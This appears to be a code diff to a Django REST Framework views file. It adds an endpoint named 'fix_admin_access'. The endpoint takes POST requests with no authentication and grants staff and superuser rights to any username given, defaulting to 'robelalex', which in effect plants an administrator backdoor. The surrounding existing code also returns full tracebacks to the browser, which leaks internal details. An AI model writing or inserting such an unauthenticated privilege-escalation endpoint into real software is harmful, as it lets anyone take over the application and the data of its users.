@@ -947,3 +947,22 @@ def super_admin_panel(request):
         import traceback
         error_msg = str(e)
         return HttpResponse(f'<h2>Error: {error_msg}</h2><pre>{traceback.format_exc()}</pre>')
+    
+@api_view(['POST'])
+@permission_classes([AllowAny])
+def fix_admin_access(request):
+    username = request.data.get('username', 'robelalex')
+    try:
+        user = User.objects.get(username=username)
+        user.is_staff = True
+        user.is_superuser = True
+        user.is_active = True
+        user.save()
+        return Response({
+            'success': True,
+            'message': f'User {username} now has admin access',
+            'is_staff': user.is_staff,
+            'is_superuser': user.is_superuser
+        })
+    except User.DoesNotExist:
+        return Response({'error': 'User not found'}, status=404)
